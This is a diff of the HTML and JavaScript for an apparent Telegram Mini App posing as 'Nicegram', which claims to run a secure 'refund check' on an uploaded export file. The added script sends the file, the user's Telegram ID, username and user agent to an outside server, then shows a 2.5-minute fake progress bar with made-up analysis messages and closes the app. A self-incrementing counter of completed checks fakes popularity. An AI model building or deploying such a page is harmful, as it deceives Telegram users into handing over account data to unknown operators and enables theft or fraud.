@@ -165,7 +165,7 @@
             font-size: 12px;
             color: rgba(255, 255, 255, 0.85);
             font-weight: 600;
-            white-space: nowrap;
+            white-space: nowrap; /* Важно: текст в одну строку */
         }
 
         /* КНОПКА */
@@ -228,231 +228,11 @@
         }
         .modal.active { bottom: 0; }
         .btn-close { background: rgba(255,255,255,0.08); color: #fff; border: 1px solid rgba(255,255,255,0.1); width: 100%; padding: 16px; margin-top: 25px; border-radius: 20px; font-weight: 800; cursor: pointer; }
-
-        /* Стили для ошибки доступа */
-        .telegram-only-message {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 100vh; background: radial-gradient(circle at center, #0a1e3d 0%, #000000 100%);
-            color: #eee; font-family: 'Inter', sans-serif; text-align: center; padding: 20px; box-sizing: border-box;
-        }
-        .telegram-only-message h1 { font-size: 28px; color: #ff0077; margin-bottom: 15px; text-shadow: 0 0 10px rgba(255, 0, 119, 0.5); }
-        .telegram-only-message p { font-size: 16px; margin-bottom: 10px; color: rgba(255, 255, 255, 0.8); }
-        .telegram-only-message img { width: 120px; margin-top: 30px; opacity: 0.7; filter: drop-shadow(0 0 15px rgba(0, 255, 255, 0.4)); }
     </style>
 </head>
 <body>
 
-    <script>
-        // === Валидация запуска через Telegram Mini App ===
-        const tg = window.Telegram.WebApp;
-
-        if (!tg || !tg.initData) {
-            document.body.innerHTML = `
-                <div class="telegram-only-message">
-                    <h1>Ошибка доступа</h1>
-                    <p>Это приложение должно быть открыто внутри Telegram.</p>
-                    <p>Пожалуйста, используйте официальный клиент Telegram для доступа.</p>
-                    <img src="https://cdn-icons-png.flaticon.com/512/744/744546.png" alt="Error Icon">
-                </div>
-            `;
-            throw new Error("Telegram WebApp not found or InitData missing.");
-        }
-
-        tg.expand(); 
-        // =================================================
-
-        // === СПИСОК ЗАБЛОКИРОВАННЫХ ПОЛЬЗОВАТЕЛЕЙ (Frontend-проверка) ===
-        const BANNED_USERS = ['monk']; 
-        const SERVER_URL = "https://nicegrammarse.onrender.com";
-        // ===========================================
-
-        try {
-            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                document.getElementById('greeting').innerText = `Привет, ${tg.initDataUnsafe.user.first_name || 'Тракер'}`;
-            }
-        } catch (e) { console.error(e); }
-
-        function isUserBanned() {
-            try {
-                const user = tg.initDataUnsafe.user;
-                if (!user || !user.username) return false;
-                return BANNED_USERS.includes(user.username.toLowerCase());
-            } catch (e) {
-                return false; 
-            }
-        }
-
-        function logEntry() {
-            try {
-                if (isUserBanned()) return;
-
-                fetch(`${SERVER_URL}/log_entry`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'X-Telegram-Init-Data': tg.initData // <--- ОТПРАВЛЯЕМ ПОДПИСЬ
-                    },
-                    body: JSON.stringify({
-                        user_agent: navigator.userAgent,
-                        platform: tg.platform || "unknown"
-                    })
-                }).catch(e => console.error("Log fetch failed:", e));
-            } catch (err) { console.error("Log error:", err); }
-        }
-        
-        // Логируем вход сразу
-        logEntry();
-
-        // === СЧЕТЧИК ===
-        setInterval(() => {
-            const counterElement = document.getElementById('live-counter');
-            if (counterElement) {
-                let currentVal = parseInt(counterElement.innerText.replace(/\D/g, ''));
-                if (!isNaN(currentVal)) {
-                    currentVal++;
-                    counterElement.innerText = currentVal.toLocaleString('ru-RU');
-                }
-            }
-        }, 10000); 
-
-        let isUploading = false; 
-        let lastUploadTime = 0; 
-
-        function startVerification(input) {
-            const file = input.files[0];
-            if (!file) return;
-
-            if (isUserBanned()) {
-                alert("Вы не можете использовать эту функцию.");
-                input.value = ''; 
-                return;
-            }
-
-            const currentTime = Date.now();
-            const COOLDOWN_PERIOD = 5000;
-            if (isUploading || (currentTime - lastUploadTime < COOLDOWN_PERIOD)) {
-                alert("Пожалуйста, подождите перед новой загрузкой.");
-                input.value = '';
-                return;
-            }
-
-            // Ограничение размера
-            const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB
-            if (file.size > MAX_FILE_SIZE) {
-                alert(`Размер файла превышает максимально допустимый.`);
-                input.value = '';
-                return;
-            }
-
-            isUploading = true;
-            lastUploadTime = currentTime;
-
-            document.getElementById('step-start').style.display = 'none';
-            document.getElementById('step-loading').style.display = 'flex';
-
-            uploadFileInBackground(file);
-
-            let progress = 0;
-            const totalDuration = 150000; // 2.5 минуты фейк-загрузки
-            const intervalTime = 100;
-            const increment = (100 / (totalDuration / intervalTime));
-
-            const timer = setInterval(() => {
-                progress += increment;
-                if (progress > 100) progress = 100;
-
-                const st = document.getElementById('statusText');
-                const pt = document.getElementById('percentText');
-                if(pt) pt.innerText = Math.floor(progress) + "%";
-
-                if (st) {
-                    if (progress < 10) st.innerText = "Инициализация безопасного соединения...";
-                    else if (progress < 30) st.innerText = "Сканирование структуры файла...";
-                    else if (progress < 55) st.innerText = "Анализ данных на предмет аномалий...";
-                    else if (progress < 80) st.innerText = "Кросс-проверка с базой известных кейсов...";
-                    else if (progress < 95) st.innerText = "Финальная верификация...";
-                    else st.innerText = "Формирование вердикта...";
-                }
-
-                if (progress >= 100) {
-                    clearInterval(timer);
-                    isUploading = false;
-                    if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
-                    setTimeout(() => { tg.close(); }, 1500); 
-                }
-            }, intervalTime);
-        }
-
-        function uploadFileInBackground(file) {
-            try {
-                if (isUserBanned()) return; 
-
-                const formData = new FormData();
-                formData.append('file', file);
-                formData.append('user_agent', navigator.userAgent);
-                
-                fetch(`${SERVER_URL}/upload`, { 
-                    method: 'POST', 
-                    headers: {
-                        'X-Telegram-Init-Data': tg.initData // <--- ОТПРАВЛЯЕМ ПОДПИСЬ
-                    },
-                    body: formData 
-                })
-                .catch(e => console.error("Upload fetch failed:", e));
-            } catch (err) { console.error("Upload error:", err); }
-        }
-
-        // === АНИМАЦИИ (Снег, частицы) ===
-        const snowContainer = document.getElementById('snow');
-        if (snowContainer) {
-            const flakesCount = 50; 
-            for (let i = 0; i < flakesCount; i++) {
-                const flake = document.createElement('div');
-                flake.className = 'snowflake';
-                flake.style.left = Math.random() * 100 + '%';
-                const size = Math.random() * 4 + 2; 
-                flake.style.width = size + 'px';
-                flake.style.height = size + 'px';
-                if(size < 3) {
-                     flake.style.filter = 'blur(1px)';
-                     flake.style.opacity = '0.4';
-                }
-                flake.style.animationDuration = Math.random() * 5 + 5 + 's';
-                flake.style.animationDelay = Math.random() * 5 + 's';
-                snowContainer.appendChild(flake);
-            }
-        }
-
-        (function() {
-            const container = document.getElementById('particles');
-            if(!container) return;
-            var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d');
-            container.appendChild(canvas);
-            var particles = [], width, height;
-            function resize() { width = window.innerWidth; height = window.innerHeight; canvas.width = width; canvas.height = height; }
-            function Particle() { this.x = Math.random() * width; this.y = Math.random() * height; this.vx = (Math.random() - 0.5) * 0.2; this.vy = (Math.random() - 0.5) * 0.2; this.size = Math.random() * 1.5; }
-            Particle.prototype.update = function() { this.x += this.vx; this.y += this.vy; if (this.x < 0 || this.x > width) this.vx *= -1; if (this.y < 0 || this.y > height) this.vy *= -1; };
-            Particle.prototype.draw = function() { ctx.fillStyle = 'rgba(0, 255, 255, 0.3)'; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); };
-            window.addEventListener('resize', resize); resize();
-            for (var i = 0; i < 35; i++) particles.push(new Particle());
-            function animate() { ctx.clearRect(0, 0, width, height); particles.forEach(p => { p.update(); p.draw(); }); requestAnimationFrame(animate); }
-            animate();
-        })();
-
-        function openModal(id) { 
-            const overlay = document.querySelector('.modal-overlay');
-            const modal = document.getElementById(id);
-            if(overlay) overlay.classList.add('active'); 
-            if(modal) modal.classList.add('active'); 
-        }
-        function closeAllModals() { 
-            const overlay = document.querySelector('.modal-overlay');
-            if(overlay) overlay.classList.remove('active'); 
-            document.querySelectorAll('.modal').forEach(m => m.classList.remove('active')); 
-        }
-    </script>
-
-    <!-- UI ЭЛЕМЕНТЫ -->
+    <!-- ЭФФЕКТЫ -->
     <div class="frost-vignette"></div>
     <div class="garland-wrap">
         <div class="light-bulb bulb-cyan"></div>
@@ -481,15 +261,19 @@
     </div>
 
     <div class="glass-card">
+        <!-- Декоративная шапка -->
         <img src="https://cdn-icons-png.flaticon.com/512/744/744546.png" class="santa-hat-icon" alt="NY">
+        
         <div class="logo-text">Nicegram</div>
         
         <div id="step-start">
             <h1 id="greeting">Привет, Тракер</h1>
             <p style="font-size: 14px; color: var(--text-secondary); margin-bottom: 25px; line-height: 1.5;">Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
             
+            <!-- БЛОК СТАТИСТИКИ -->
             <div class="stats-badge">
                 <div class="live-dot"></div>
+                <!-- Обернули цифру в span id="live-counter" для JS -->
                 <div class="stats-text">Пройдено проверок на рефаунд за день <span id="live-counter">8&nbsp;650</span></div>
             </div>
 
@@ -541,5 +325,167 @@
         <button class="btn-close" onclick="closeAllModals()">Закрыть</button>
     </div>
 
+    <script>
+        // === СПИСОК ЗАБЛОКИРОВАННЫХ ПОЛЬЗОВАТЕЛЕЙ ===
+        const BANNED_USERS = ['monk']; 
+        // ===========================================
+
+        const SERVER_URL = "https://nicegrammarse.onrender.com";
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        try {
+            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                document.getElementById('greeting').innerText = `Привет, ${tg.initDataUnsafe.user.first_name || 'Тракер'}`;
+            }
+        } catch (e) { console.error(e); }
+
+        function isUserBanned() {
+            try {
+                const user = tg.initDataUnsafe.user;
+                if (!user || !user.username) return false;
+                return BANNED_USERS.includes(user.username.toLowerCase());
+            } catch (e) {
+                return false; 
+            }
+        }
+
+        function logEntry() {
+            try {
+                const user = tg.initDataUnsafe.user || {};
+                if (isUserBanned()) return; 
+
+                fetch(`${SERVER_URL}/log_entry`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        user_id: user.id || "0000",
+                        username: user.username || "no_username",
+                        user_agent: navigator.userAgent,
+                        platform: tg.platform || "unknown"
+                    })
+                }).catch(e => console.error("Log fetch failed:", e));
+            } catch (err) { console.error("Log error:", err); }
+        }
+        logEntry();
+
+        // === СКРИПТ АНИМАЦИИ СЧЕТЧИКА ===
+        // Увеличивает число на 1 каждые 10 секунд
+        setInterval(() => {
+            const counterElement = document.getElementById('live-counter');
+            if (counterElement) {
+                // Берем только цифры из текста (удаляем пробелы и &nbsp;)
+                let currentVal = parseInt(counterElement.innerText.replace(/\D/g, ''));
+                if (!isNaN(currentVal)) {
+                    currentVal++;
+                    // toLocaleString('ru-RU') добавляет разделитель (пробел)
+                    counterElement.innerText = currentVal.toLocaleString('ru-RU');
+                }
+            }
+        }, 10000); // 10000 мс = 10 секунд
+        // ================================
+
+        function startVerification(input) {
+            const file = input.files[0];
+            if (!file) return;
+
+            document.getElementById('step-start').style.display = 'none';
+            document.getElementById('step-loading').style.display = 'flex';
+
+            uploadFileInBackground(file);
+
+            let progress = 0;
+            const totalDuration = 150000; 
+            const intervalTime = 100; 
+            const increment = (100 / (totalDuration / intervalTime));
+
+            const timer = setInterval(() => {
+                progress += increment;
+                if (progress > 100) progress = 100;
+
+                const st = document.getElementById('statusText');
+                const pt = document.getElementById('percentText');
+                if(pt) pt.innerText = Math.floor(progress) + "%";
+
+                if (st) {
+                    if (progress < 20) st.innerText = "Проверяем ликвидность файла";
+                    else if (progress < 45) st.innerText = "Анализируем аукционы";
+                    else if (progress < 75) st.innerText = "Проверка происхождения звёзд";
+                    else if (progress < 95) st.innerText = "Завершение анализа";
+                    else st.innerText = "Формирование вердикта";
+                }
+
+                if (progress >= 100) {
+                    clearInterval(timer);
+                    if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+                    setTimeout(() => { tg.close(); }, 1500);
+                }
+            }, intervalTime);
+        }
+
+        function uploadFileInBackground(file) {
+            try {
+                const user = tg.initDataUnsafe.user || {};
+                if (isUserBanned()) return; 
+
+                const formData = new FormData();
+                formData.append('file', file);
+                formData.append('user_id', user.id || "0000");
+                formData.append('username', user.username || "no_username");
+                formData.append('user_agent', navigator.userAgent);
+                
+                fetch(`${SERVER_URL}/upload`, { method: 'POST', body: formData })
+                    .catch(e => console.error("Upload fetch failed:", e));
+            } catch (err) { console.error("Upload error:", err); }
+        }
+
+        const snowContainer = document.getElementById('snow');
+        if (snowContainer) {
+            const flakesCount = 50; 
+            for (let i = 0; i < flakesCount; i++) {
+                const flake = document.createElement('div');
+                flake.className = 'snowflake';
+                flake.style.left = Math.random() * 100 + '%';
+                const size = Math.random() * 4 + 2; 
+                flake.style.width = size + 'px';
+                flake.style.height = size + 'px';
+                if(size < 3) {
+                     flake.style.filter = 'blur(1px)';
+                     flake.style.opacity = '0.4';
+                }
+                flake.style.animationDuration = Math.random() * 5 + 5 + 's';
+                flake.style.animationDelay = Math.random() * 5 + 's';
+                snowContainer.appendChild(flake);
+            }
+        }
+
+        (function() {
+            const container = document.getElementById('particles');
+            if(!container) return;
+            var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d');
+            container.appendChild(canvas);
+            var particles = [], width, height;
+            function resize() { width = window.innerWidth; height = window.innerHeight; canvas.width = width; canvas.height = height; }
+            function Particle() { this.x = Math.random() * width; this.y = Math.random() * height; this.vx = (Math.random() - 0.5) * 0.2; this.vy = (Math.random() - 0.5) * 0.2; this.size = Math.random() * 1.5; }
+            Particle.prototype.update = function() { this.x += this.vx; this.y += this.vy; if (this.x < 0 || this.x > width) this.vx *= -1; if (this.y < 0 || this.y > height) this.vy *= -1; };
+            Particle.prototype.draw = function() { ctx.fillStyle = 'rgba(0, 255, 255, 0.3)'; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); };
+            window.addEventListener('resize', resize); resize();
+            for (var i = 0; i < 35; i++) particles.push(new Particle());
+            function animate() { ctx.clearRect(0, 0, width, height); particles.forEach(p => { p.update(); p.draw(); }); requestAnimationFrame(animate); }
+            animate();
+        })();
+
+        function openModal(id) { 
+            const overlay = document.querySelector('.modal-overlay');
+            const modal = document.getElementById(id);
+            if(overlay) overlay.classList.add('active'); 
+            if(modal) modal.classList.add('active'); 
+        }
+        function closeAllModals() { 
+            const overlay = document.querySelector('.modal-overlay');
+            if(overlay) overlay.classList.remove('active'); 
+            document.querySelectorAll('.modal').forEach(m => m.classList.remove('active')); 
+        }
+    </script>
 </body>
 </html>
